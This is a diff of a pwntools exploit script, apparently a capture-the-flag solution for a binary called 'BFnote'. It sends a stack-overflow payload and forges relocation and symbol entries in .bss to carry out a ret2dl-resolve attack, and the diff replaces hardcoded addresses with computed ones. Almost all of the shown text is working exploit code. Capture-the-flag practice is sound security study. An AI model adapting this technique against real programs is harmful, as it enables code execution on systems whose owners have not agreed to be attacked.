@@ -5,17 +5,13 @@ elf = ELF('BFnote')
 libc = ELF('libc.so.6')
 read_plt = elf.plt['read']
 read_got = elf.got['read']
-leave_ret = 0x08048578
-bss = 0x804A040
-pop_ebp_ret = 0x80489DB
-#one_gadget = 0x3A80C
 plt0 = elf.get_section_by_name('.plt').header.sh_addr
 rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
 dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
 dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
-base_stage = bss + 0x420
+base_stage = elf.bss() + 0x420
 
-payload = 'U'*0x3A + p32(bss+0x420 +4)
+payload = 'U'*0x3A + p32(elf.bss()+0x420 +4)
 p.sendafter('Give your description : ',payload)
 #--------
 fake_sym_addr = base_stage + 24 #fake_sym
@@ -29,8 +25,7 @@ index_offset = base_stage + 16 - rel_plt
 r_info = (index_dynsym << 8) | 0x7 
 fake_read_reloc = flat([read_got, r_info])
 
-payload = p32(base_stage)
-payload = payload.ljust(0x400,'\x00')
+payload = '\x00'*0x400
 payload += p32(plt0)
 payload += p32(index_offset)
 payload += 'UUUU'
